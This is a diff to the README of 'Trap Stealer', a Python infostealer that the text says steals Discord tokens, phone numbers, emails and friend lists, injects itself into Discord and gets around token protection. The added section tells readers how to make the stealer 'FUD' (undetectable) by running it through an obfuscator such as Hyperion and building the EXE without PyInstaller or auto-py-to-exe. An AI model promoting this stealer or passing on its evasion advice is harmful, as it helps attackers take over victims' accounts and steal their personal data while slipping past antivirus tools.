@@ -4,6 +4,12 @@
 - [📝・Changelog](#changelog)
 - [💼・Term](#terms)
 
+## How to make it FUD
+
+Use any good obfuscator Hyperion/Some other 
+
+Make it into EXE don't use PYINSTALLER and auto-py-to-exe
+
 ## 🔒 Trap Stealer 🔍
 Trap Stealer is a Python script that can steal Discord tokens, phone numbers, emails, and HQ friends. It also has the ability to inject itself into Discord and grab special files. That's bypass some type of token protection 🔓. It steals everything in under 4 seconds.
 
